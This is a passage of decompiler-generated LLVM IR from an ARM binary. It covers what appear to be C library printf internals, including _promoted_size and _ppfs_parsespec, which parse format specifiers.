  br i1 %v5_15098, label %dec_label_pc_14fc8, label %dec_label_pc_15090.dec_label_pc_1509c.loopexit_crit_edge

dec_label_pc_150a0:                               ; preds = %entry
  br i1 %v6_14f7c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_150a0
  %v2_150a4 = add i32 %v0_14f64, 36
  %v3_150a4 = inttoptr i32 %v2_150a4 to i8*
  %v4_150a4 = load i8, i8* %v3_150a4, align 1
  %v5_150a4 = zext i8 %v4_150a4 to i32
  %v5_150a8 = mul nuw nsw i32 %v5_150a4, 8
  %v6_150a8 = add i32 %v5_150a8, %v1_14f70
  store i32 %v6_150a8, i32* %r3.global-to-local, align 4
  %v2_150ac = add i32 %v6_150a8, -8
  %v3_150ac = inttoptr i32 %v2_150ac to i32*
  %v4_150ac = load i32, i32* %v3_150ac, align 4
  store i32 %v4_150ac, i32* %r3.global-to-local, align 4
  store i32 %v4_150ac, i32* %v2_14f74, align 4
  %v0_150b4.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_150a0, %bb
  %v2_150c8 = phi i32 [ %v0_150b4.pre, %bb ], [ %v0_14f64, %dec_label_pc_150a0 ]
  %v1_150b4 = add i32 %v2_150c8, 4
  %v2_150b4 = inttoptr i32 %v1_150b4 to i32*
  %v3_150b4 = load i32, i32* %v2_150b4, align 4
  store i32 %v3_150b4, i32* %r3.global-to-local, align 4
  %v6_150b8 = icmp eq i32 %v3_150b4, -2147483648
  br i1 %v6_150b8, label %bb15, label %dec_label_pc_1509c

bb15:                                             ; preds = %.thread2
  %v2_150bc = add i32 %v2_150c8, 37
  %v3_150bc = inttoptr i32 %v2_150bc to i8*
  %v4_150bc = load i8, i8* %v3_150bc, align 1
  %v5_150bc = zext i8 %v4_150bc to i32
  %v1_150c0 = load i32, i32* %ip.global-to-local, align 4
  %v5_150c0 = mul nuw nsw i32 %v5_150bc, 8
  %v6_150c0 = add i32 %v5_150c0, %v1_150c0
  store i32 %v6_150c0, i32* %r3.global-to-local, align 4
  %v2_150c4 = add i32 %v6_150c0, -8
  %v3_150c4 = inttoptr i32 %v2_150c4 to i32*
  %v4_150c4 = load i32, i32* %v3_150c4, align 4
  store i32 %v4_150c4, i32* %r3.global-to-local, align 4
  store i32 %v4_150c4, i32* %v2_150b4, align 4
  %v0_150cc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1509c

dec_label_pc_15090.dec_label_pc_1509c.loopexit_crit_edge: ; preds = %dec_label_pc_1508c
  br label %dec_label_pc_1509c.loopexit

dec_label_pc_1509c.loopexit:                      ; preds = %dec_label_pc_15090.dec_label_pc_1509c.loopexit_crit_edge, %dec_label_pc_14fc0
  %v0_15090.lcssa = phi i32 [ %v0_15090, %dec_label_pc_15090.dec_label_pc_1509c.loopexit_crit_edge ], [ %v0_1509018, %dec_label_pc_14fc0 ]
  br label %dec_label_pc_1509c

dec_label_pc_1509c:                               ; preds = %dec_label_pc_1509c.loopexit, %.thread2, %bb15
  %v1_150ec = phi i32 [ %v0_15090.lcssa, %dec_label_pc_1509c.loopexit ], [ %v2_150c8, %.thread2 ], [ %v0_150cc.pre, %bb15 ]
  %v1_150cc = add i32 %v1_150ec, 8
  %v2_150cc = inttoptr i32 %v1_150cc to i32*
  %v3_150cc = load i32, i32* %v2_150cc, align 4
  store i32 %v3_150cc, i32* %r1.global-to-local, align 4
  %v1_150d0 = icmp slt i32 %v3_150cc, 0
  br i1 %v1_150d0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_1509c
  %v5_150d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_150d4, i32* @r4, align 4
  ret i32 %v1_150ec

bb17:                                             ; preds = %dec_label_pc_1509c
  %v1_150d8 = add i32 %v1_150ec, 16
  %v2_150d8 = inttoptr i32 %v1_150d8 to i32*
  %v3_150d8 = load i32, i32* %v2_150d8, align 4
  %v1_150e0 = sub i32 0, %v3_150cc
  store i32 %v1_150e0, i32* %r1.global-to-local, align 4
  %v1_150dc = and i32 %v3_150d8, -10
  %v1_150e4 = or i32 %v1_150dc, 8
  store i32 %v1_150e4, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_150ec = add i32 %v1_150ec, 20
  %v3_150ec = inttoptr i32 %v2_150ec to i32*
  store i32 32, i32* %v3_150ec, align 4
  %v0_150f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_150f0 = load i32, i32* @r0, align 4
  %v2_150f0 = add i32 %v1_150f0, 8
  %v3_150f0 = inttoptr i32 %v2_150f0 to i32*
  store i32 %v0_150f0, i32* %v3_150f0, align 4
  %v0_150f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_150f4 = load i32, i32* @r0, align 4
  %v2_150f4 = add i32 %v1_150f4, 16
  %v3_150f4 = inttoptr i32 %v2_150f4 to i32*
  store i32 %v0_150f4, i32* %v3_150f4, align 4
  %v2_150f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_150f8, i32* @r4, align 4
  %v8_150f8 = load i32, i32* @r0, align 4
  ret i32 %v8_150f8

; uselistorder directives
  uselistorder i32 %v1_1508c, { 2, 1, 0 }
  uselistorder i32 %v0_15090, { 1, 2, 0 }
  uselistorder i32 %v3_15060, { 0, 2, 1, 3 }
  uselistorder i32 %v3_14fd8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_14fd8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_14fcc, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_14fc824, { 1, 0 }
  uselistorder i32 %v0_1509018, { 2, 0, 1 }
  uselistorder i32 %v0_14f64, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %lr.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1509c, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1508c, { 1, 0 }
  uselistorder label %dec_label_pc_15088, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15078, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15060, { 1, 0 }
  uselistorder label %dec_label_pc_1504c, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14fc8, { 1, 0 }
  uselistorder label %dec_label_pc_14fc0, { 1, 0 }
  uselistorder label %dec_label_pc_14f9c, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_15118.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15104

dec_label_pc_15104:                               ; preds = %dec_label_pc_15120, %entry
  %v0_15104 = phi i32 [ %v1_15104, %dec_label_pc_15120 ], [ ptrtoint (i32* @global_var_1f6c4.913 to i32), %entry ]
  %v1_15104 = add i32 %v0_15104, -2
  %v1_15108 = add i32 %v0_15104, -1
  %v2_15108 = inttoptr i32 %v1_15108 to i8*
  %v3_15108 = load i8, i8* %v2_15108, align 1
  %v4_15108 = zext i8 %v3_15108 to i32
  %v1_1510c = inttoptr i32 %v1_15104 to i8*
  %v2_1510c = load i8, i8* %v1_1510c, align 2
  %v3_1510c = zext i8 %v2_1510c to i32
  %v3_15110 = mul nuw i32 %v4_15108, 16777216
  %v4_15114 = sdiv i32 %v3_15110, 65536
  %v5_15114 = or i32 %v4_15114, %v3_1510c
  %v9_15118 = icmp eq i32 %v5_15114, %v1_15118.pre
  br i1 %v9_15118, label %dec_label_pc_15104.dec_label_pc_1512c_crit_edge, label %dec_label_pc_15120

dec_label_pc_15104.dec_label_pc_1512c_crit_edge:  ; preds = %dec_label_pc_15104
  br label %dec_label_pc_1512c

dec_label_pc_15120:                               ; preds = %dec_label_pc_15104
  %tmp = icmp ugt i32 %v1_15104, ptrtoint (i32* @global_var_1f6ac.915 to i32)
  br i1 %tmp, label %dec_label_pc_15104, label %dec_label_pc_1512c

dec_label_pc_1512c:                               ; preds = %dec_label_pc_15120, %dec_label_pc_15104.dec_label_pc_1512c_crit_edge
  %v2_15134.pre-phi = sub i32 %v1_15104, ptrtoint (i32* @global_var_1f6ac.915 to i32)
  store i32 ptrtoint (i32* @global_var_1f6c4.913 to i32), i32* @r2, align 4
  %v4_15138 = sdiv i32 %v2_15134.pre-phi, 2
  %v5_15138 = add i32 %v4_15138, ptrtoint (i32* @global_var_1f6c4.913 to i32)
  %v6_15138 = inttoptr i32 %v5_15138 to i8*
  %v7_15138 = load i8, i8* %v6_15138, align 1
  %v9_15138 = zext i8 %v7_15138 to i32
  ret i32 %v9_15138

; uselistorder directives
  uselistorder i32 %v1_15104, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15104, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f6c4.913 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1514c = load i32, i32* @r4, align 4
  store i32 %v3_1514c, i32* %stack_var_-32, align 4
  %v6_1514c = load i32, i32* @r5, align 4
  %v25_1514c = ptrtoint i32* %stack_var_-32 to i32
  %v1_15150 = add i32 %tmp, 16
  %v2_15150 = inttoptr i32 %v1_15150 to i32*
  %v3_15150 = load i32, i32* %v2_15150, align 4
  %v2_15154 = ptrtoint i32* %stack_var_-88 to i32
  %v1_15158 = and i32 %v3_15150, 128
  store i32 %v1_15158, i32* @r4, align 4
  %v2_15158 = icmp eq i32 %v1_15158, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_15178 = add i32 %tmp, 24
  %v2_15178 = inttoptr i32 %v1_15178 to i32*
  %v3_15178 = load i32, i32* %v2_15178, align 4
  store i32 %v3_15178, i32* %sb.global-to-local, align 4
  br i1 %v2_15158, label %bb, label %dec_label_pc_15198

bb:                                               ; preds = %entry
  %v3_1517c = load i32, i32* %arg1, align 4
  br label %dec_label_pc_151e4

dec_label_pc_15188:                               ; preds = %dec_label_pc_15368
  %v0_15188 = load i32, i32* %r0.global-to-local, align 4
  %v0_15398.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15390

dec_label_pc_15190:                               ; preds = %dec_label_pc_15394
  %v1_15190 = add i32 %v0_15398.pre, 1
  store i32 %v1_15190, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153b0

dec_label_pc_15198:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1519c

dec_label_pc_1519c:                               ; preds = %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge, %dec_label_pc_15198
  %v1_151ac = phi i32 [ %v1_151c0, %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge ], [ 0, %dec_label_pc_15198 ]
  %v0_1519c = phi i32 [ %v0_1519c.pre, %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge ], [ %tmp, %dec_label_pc_15198 ]
  %v1_1519c = inttoptr i32 %v0_1519c to i32*
  %v2_1519c = load i32, i32* %v1_1519c, align 4
  %v4_151a0 = mul i32 %v1_151ac, 4
  %v5_151a0 = add i32 %v2_1519c, %v4_151a0
  store i32 %v5_151a0, i32* %r3.global-to-local, align 4
  %v1_151a4 = add i32 %v5_151a0, -4
  %v2_151a4 = inttoptr i32 %v1_151a4 to i32*
  %v3_151a4 = load i32, i32* %v2_151a4, align 4
  store i32 %v3_151a4, i32* %r1.global-to-local, align 4
  store i32 %v25_1514c, i32* %ip.global-to-local, align 4
  %v2_151ac = add i32 %v1_151ac, %v25_1514c
  store i32 %v2_151ac, i32* %r2.global-to-local, align 4
  %v1_151b0 = trunc i32 %v3_151a4 to i8
  %v3_151b0 = add i32 %v2_151ac, -56
  %v4_151b0 = inttoptr i32 %v3_151b0 to i8*
  store i8 %v1_151b0, i8* %v4_151b0, align 1
  %v0_151b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_151b4 = add i32 %v0_151b4, -56
  %v2_151b4 = inttoptr i32 %v1_151b4 to i8*
  %v3_151b4 = load i8, i8* %v2_151b4, align 1
  %v4_151b4 = zext i8 %v3_151b4 to i32
  store i32 %v4_151b4, i32* %r2.global-to-local, align 4
  %v0_151b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_151b8 = add i32 %v0_151b8, -4
  %v2_151b8 = inttoptr i32 %v1_151b8 to i32*
  %v3_151b8 = load i32, i32* %v2_151b8, align 4
  store i32 %v3_151b8, i32* %r3.global-to-local, align 4
  %v9_151bc = icmp eq i32 %v4_151b4, %v3_151b8
  %v0_151c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_151c0 = add i32 %v0_151c0, 1
  store i32 %v1_151c0, i32* %r0.global-to-local, align 4
  br i1 %v9_151bc, label %dec_label_pc_151c8, label %dec_label_pc_155e0

dec_label_pc_151c8:                               ; preds = %dec_label_pc_1519c
  %v2_151c8 = icmp eq i8 %v3_151b4, 0
  br i1 %v2_151c8, label %dec_label_pc_151d8, label %dec_label_pc_151d0

dec_label_pc_151d0:                               ; preds = %dec_label_pc_151c8
  %tmp166 = icmp ult i32 %v1_151c0, 32
  br i1 %tmp166, label %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge, label %dec_label_pc_151d8

dec_label_pc_151d0.dec_label_pc_1519c_crit_edge:  ; preds = %dec_label_pc_151d0
  %v0_1519c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1519c

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151d0, %dec_label_pc_151c8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_151e0 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_151e4

dec_label_pc_151e4:                               ; preds = %bb, %dec_label_pc_151d8
  %storemerge102 = phi i32 [ %v2_151e0, %dec_label_pc_151d8 ], [ %v3_1517c, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151f0:                               ; preds = %.thread22, %dec_label_pc_15300
  %v0_151f0 = phi i32 [ %v2_15378, %.thread22 ], [ %storemerge105, %dec_label_pc_15300 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_15300 ]
  store i32 %v0_151f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %dec_label_pc_151e4, %dec_label_pc_151f0
  %v1_15210 = phi i32 [ %storemerge102, %dec_label_pc_151e4 ], [ %v0_151f0, %dec_label_pc_151f0 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_151e4 ], [ %stack_var_-48.0, %dec_label_pc_151f0 ]
  %v1_151f4 = inttoptr i32 %v1_15210 to i8*
  %v2_151f4 = load i8, i8* %v1_151f4, align 1
  %v3_151f4 = zext i8 %v2_151f4 to i32
  store i32 %v3_151f4, i32* %r3.global-to-local, align 4
  %v7_151f8 = icmp eq i8 %v2_151f4, 42
  br i1 %v7_151f8, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_151f4
  store i32 %v1_15210, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_151f4
  %v1_15204 = load i32, i32* @lr, align 4
  %v4_15204 = mul i32 %v1_15204, -4
  %v5_15204 = add i32 %v4_15204, %v25_1514c
  store i32 %v5_15204, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15210 = add i32 %v1_15210, 1
  store i32 %v2_15210, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_15218 = add i32 %v5_15204, -12
  %v4_15218 = inttoptr i32 %v3_15218 to i32*
  store i32 0, i32* %v4_15218, align 4
  %v0_1523c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_1523c.pre = phi i32 [ %v0_1523c.pre.pre, %bb124 ], [ %v1_15210, %.thread9.thread ]
  %v2_15240.pre = load i32, i32* @global_var_288c8, align 4
  br label %.backedge

dec_label_pc_15220:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_15224 = load i32, i32* %r0.global-to-local, align 4
  %v7_15228 = icmp sgt i32 %v0_15224, 4094
  br i1 %v7_15228, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_15220
  %v1_1523014 = add i32 %v0_152b4, 1
  store i32 %v1_1523014, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_15220
  %v11_1522c = mul i32 %v0_15224, 10
  %v12_1522c = add i32 %v11_1522c, %v3_1523c
  store i32 %v12_1522c, i32* %r3.global-to-local, align 4
  %v1_15230 = add i32 %v0_152b4, 1
  store i32 %v1_15230, i32* %r6.global-to-local, align 4
  %v9_15234 = add i32 %v12_1522c, -48
  store i32 %v9_15234, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_152b4 = phi i32 [ %v0_1523c.pre, %.preheader ], [ %v1_15230, %bb126 ], [ %v1_1523014, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_288c8 to i32), i32* %r3.global-to-local, align 4
  %v1_1523c = inttoptr i32 %v0_152b4 to i8*
  %v2_1523c = load i8, i8* %v1_1523c, align 1
  %v3_1523c = zext i8 %v2_1523c to i32
  store i32 %v3_1523c, i32* %r2.global-to-local, align 4
  store i32 %v2_15240.pre, i32* %r3.global-to-local, align 4
  %v3_15244 = mul nuw nsw i32 %v3_1523c, 2
  %v4_15244 = add i32 %v3_15244, %v2_15240.pre
  %v5_15244 = inttoptr i32 %v4_15244 to i8*
  %v6_15244 = load i8, i8* %v5_15244, align 1
  %v8_15244 = zext i8 %v6_15244 to i32
  store i32 %v8_15244, i32* %r3.global-to-local, align 4
  %v1_15248 = and i32 %v8_15244, 8
  %v2_15248 = icmp eq i32 %v1_15248, 0
  br i1 %v2_15248, label %dec_label_pc_15250, label %dec_label_pc_15220

dec_label_pc_15250:                               ; preds = %.backedge
  %v0_15250 = load i32, i32* %r1.global-to-local, align 4
  %v1_15250 = add i32 %v0_15250, -1
  %v2_15250 = inttoptr i32 %v1_15250 to i8*
  %v3_15250 = load i8, i8* %v2_15250, align 1
  %v4_15250 = zext i8 %v3_15250 to i32
  store i32 %v4_15250, i32* %r3.global-to-local, align 4
  %v7_15254 = icmp eq i8 %v3_15250, 37
  br i1 %v7_15254, label %dec_label_pc_1525c, label %dec_label_pc_15318

dec_label_pc_1525c:                               ; preds = %dec_label_pc_15250
  %v7_1525c = icmp eq i8 %v2_1523c, 36
  %. = zext i1 %v7_1525c to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_15268 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_15268, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_1525c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1525c, %bb130
  %v1_152c4 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_1525c ]
  %v2_15270 = icmp eq i32 %v1_152c4, 0
  %v0_152a0 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_15270, label %dec_label_pc_152a0, label %dec_label_pc_15278

dec_label_pc_15278:                               ; preds = %thread-pre-split
  %v2_152a0 = icmp eq i32 %v0_152a0, 0
  %v1_1527c = add i32 %v0_152b4, 1
  store i32 %v1_1527c, i32* %r1.global-to-local, align 4
  br i1 %v2_152a0, label %dec_label_pc_155e0, label %dec_label_pc_15284

dec_label_pc_15284:                               ; preds = %dec_label_pc_15278
  %v2_15284 = sub i32 %v0_15268, %v0_152a0
  %v4_15284 = xor i32 %v0_152a0, %v0_15268
  %v5_15284 = xor i32 %v2_15284, %v0_15268
  %v6_15284 = and i32 %v5_15284, %v4_15284
  %v7_15284 = icmp slt i32 %v6_15284, 0
  %v8_15284 = icmp slt i32 %v2_15284, 0
  %v9_15284 = icmp eq i32 %v0_15268, %v0_152a0
  %v3_15288 = xor i1 %v8_15284, %v7_15284
  %v4_15288 = or i1 %v9_15284, %v3_15288
  br i1 %v4_15288, label %dec_label_pc_15298, label %bb131

bb131:                                            ; preds = %dec_label_pc_15284
  store i32 %v0_15268, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15298

dec_label_pc_15294:                               ; preds = %dec_label_pc_152b4, %dec_label_pc_152bc
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %bb131, %dec_label_pc_15284, %dec_label_pc_15294
  %v0_15298 = phi i32 [ %v0_15250, %dec_label_pc_15294 ], [ %v1_1527c, %dec_label_pc_15284 ], [ %v1_1527c, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_15294 ], [ %v0_15268, %dec_label_pc_15284 ], [ %v0_15268, %bb131 ]
  br label %dec_label_pc_152d0

dec_label_pc_152a0:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_152a0, 1
  br i1 %tmp132, label %dec_label_pc_152b4, label %dec_label_pc_152a8

dec_label_pc_152a8:                               ; preds = %dec_label_pc_152a0
  %v7_152a8 = icmp eq i8 %v2_1523c, 109
  br i1 %v7_152a8, label %dec_label_pc_15318, label %dec_label_pc_155e0

dec_label_pc_152b4:                               ; preds = %dec_label_pc_152a0
  %tmp167 = icmp ugt i32 %v0_152b4, %v0_15250
  br i1 %tmp167, label %dec_label_pc_152bc, label %dec_label_pc_15294

dec_label_pc_152bc:                               ; preds = %dec_label_pc_152b4
  %v1_152bc = inttoptr i32 %v0_15250 to i8*
  %v2_152bc = load i8, i8* %v1_152bc, align 1
  %v3_152bc = zext i8 %v2_152bc to i32
  store i32 %v3_152bc, i32* %r3.global-to-local, align 4
  %v7_152c0 = icmp eq i8 %v2_152bc, 48
  br i1 %v7_152c0, label %dec_label_pc_15294, label %bb133

bb133:                                            ; preds = %dec_label_pc_152bc
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15318

dec_label_pc_152d0.loopexit:                      ; preds = %dec_label_pc_152d8
  %v1_152e4 = load i32, i32* @r4, align 4
  %v3_152e4 = or i32 %v1_152e4, %v0_152f8
  store i32 %v3_152e4, i32* @r4, align 4
  %v2_152e8 = add i32 %storemerge105, 1
  br label %dec_label_pc_152d0

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152d0.loopexit, %dec_label_pc_15298
  %storemerge105 = phi i32 [ %v0_15298, %dec_label_pc_15298 ], [ %v2_152e8, %dec_label_pc_152d0.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1f6a4.920 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_152dc = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152f0, %dec_label_pc_152d0
  %v0_152f8 = phi i32 [ %v2_152f8, %dec_label_pc_152f0 ], [ 1, %dec_label_pc_152d0 ]
  %v0_152d8 = phi i32 [ %v5_152d8, %dec_label_pc_152f0 ], [ ptrtoint ([8 x i8]* @global_var_1f6a4.920 to i32), %dec_label_pc_152d0 ]
  %v1_152d8 = inttoptr i32 %v0_152d8 to i8*
  %v2_152d8 = load i8, i8* %v1_152d8, align 1
  %v3_152d8 = zext i8 %v2_152d8 to i32
  store i32 %v3_152d8, i32* %r2.global-to-local, align 4
  %v5_152d8 = add i32 %v0_152d8, 1
  store i32 %v5_152d8, i32* %r1.global-to-local, align 4
  %v2_152dc = load i8, i8* %v1_152dc, align 1
  %v3_152dc = zext i8 %v2_152dc to i32
  store i32 %v3_152dc, i32* %r3.global-to-local, align 4
  %v9_152e0 = icmp eq i8 %v2_152dc, %v2_152d8
  br i1 %v9_152e0, label %dec_label_pc_152d0.loopexit, label %dec_label_pc_152f0

dec_label_pc_152f0:                               ; preds = %dec_label_pc_152d8
  %v1_152f0 = inttoptr i32 %v5_152d8 to i8*
  %v2_152f0 = load i8, i8* %v1_152f0, align 1
  %v3_152f0 = zext i8 %v2_152f0 to i32
  store i32 %v3_152f0, i32* %r3.global-to-local, align 4
  %v2_152f4 = icmp eq i8 %v2_152f0, 0
  %v2_152f8 = mul i32 %v0_152f8, 2
  store i32 %v2_152f8, i32* %r0.global-to-local, align 4
  br i1 %v2_152f4, label %dec_label_pc_15300, label %dec_label_pc_152d8

dec_label_pc_15300:                               ; preds = %dec_label_pc_152f0
  %v1_15300 = add i32 %storemerge105, -1
  %v2_15300 = inttoptr i32 %v1_15300 to i8*
  %v3_15300 = load i8, i8* %v2_15300, align 1
  %v7_15304 = icmp eq i8 %v3_15300, 37
  %v0_15308 = load i32, i32* @r4, align 4
  %v1_15308 = and i32 %v0_15308, 10
  store i32 %v1_15308, i32* %r3.global-to-local, align 4
  %v4_1530c = udiv i32 %v1_15308, 2
  %v5_1530c = sub nuw nsw i32 -1, %v4_1530c
  %v6_1530c = and i32 %v0_15308, %v5_1530c
  store i32 %v6_1530c, i32* @r4, align 4
  br i1 %v7_15304, label %dec_label_pc_15314, label %dec_label_pc_151f0

dec_label_pc_15314:                               ; preds = %dec_label_pc_15300
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %bb133, %dec_label_pc_15250, %dec_label_pc_152a8, %dec_label_pc_15314
  %v1_1535c = phi i32 [ %storemerge105, %dec_label_pc_15314 ], [ %v0_152b4, %bb133 ], [ %v0_152b4, %dec_label_pc_152a8 ], [ %v0_152b4, %dec_label_pc_15250 ]
  %v0_15358 = phi i32 [ %v5_152d8, %dec_label_pc_15314 ], [ %v0_15250, %bb133 ], [ %v0_15250, %dec_label_pc_152a8 ], [ %v0_15250, %dec_label_pc_15250 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_15314 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_152a8 ], [ %stack_var_-48.1, %dec_label_pc_15250 ]
  %v1_15318 = inttoptr i32 %v0_15358 to i8*
  %v2_15318 = load i8, i8* %v1_15318, align 1
  %v3_15318 = zext i8 %v2_15318 to i32
  store i32 %v3_15318, i32* %r3.global-to-local, align 4
  %v7_1531c = icmp eq i8 %v2_15318, 42
  br i1 %v7_1531c, label %dec_label_pc_15324, label %dec_label_pc_15368

dec_label_pc_15324:                               ; preds = %dec_label_pc_15318
  %v0_15324 = load i32, i32* %sb.global-to-local, align 4
  %v2_15324 = icmp eq i32 %v0_15324, 0
  br i1 %v2_15324, label %dec_label_pc_15358, label %dec_label_pc_1532c

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15324
  %v1_1532c = inttoptr i32 %v1_1535c to i8*
  %v2_1532c = load i8, i8* %v1_1532c, align 1
  %v3_1532c = zext i8 %v2_1532c to i32
  store i32 %v3_1532c, i32* %r3.global-to-local, align 4
  %v7_15330 = icmp eq i8 %v2_1532c, 36
  br i1 %v7_15330, label %dec_label_pc_15338, label %dec_label_pc_155e0

dec_label_pc_15338:                               ; preds = %dec_label_pc_1532c
  %v0_15338 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_15338, 1
  br i1 %tmp134, label %dec_label_pc_155e0, label %dec_label_pc_15340

dec_label_pc_15340:                               ; preds = %dec_label_pc_15338
  store i32 %v25_1514c, i32* %r1.global-to-local, align 4
  %v0_15348 = load i32, i32* @lr, align 4
  %v3_15348 = mul i32 %v0_15348, -4
  %v4_15348 = add i32 %v3_15348, %v25_1514c
  store i32 %v4_15348, i32* %r3.global-to-local, align 4
  %v1_1534c = add i32 %v1_1535c, 1
  store i32 %v1_1534c, i32* %r6.global-to-local, align 4
  %v2_15350 = add i32 %v4_15348, -24
  %v3_15350 = inttoptr i32 %v2_15350 to i32*
  store i32 %v0_15338, i32* %v3_15350, align 4
  br label %dec_label_pc_15364

dec_label_pc_15358:                               ; preds = %dec_label_pc_15324
  %v1_15358 = add i32 %v0_15358, 1
  store i32 %v1_15358, i32* %r3.global-to-local, align 4
  %v9_1535c = icmp eq i32 %v1_15358, %v1_1535c
